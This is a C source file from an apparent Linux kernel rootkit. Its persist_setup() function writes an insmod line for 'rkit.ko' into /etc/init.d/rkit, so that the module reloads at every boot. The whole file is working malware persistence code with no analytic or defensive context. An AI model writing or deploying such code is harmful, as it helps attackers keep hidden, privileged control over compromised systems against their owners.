#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/uaccess.h>
#include "persist.h"

#define PERSIST_FILE "/etc/init.d/rkit"
#define PERSIST_LINE "insmod /lib/modules/rkit/rkit.ko\n"

void persist_setup(void)
{
    struct file *f;
    loff_t pos = 0;

    f = filp_open(PERSIST_FILE, O_WRONLY | O_CREAT | O_APPEND, 0755);
    if (IS_ERR(f))
        return;

    kernel_write(f, PERSIST_LINE, strlen(PERSIST_LINE), &pos);
    filp_close(f, NULL);
}
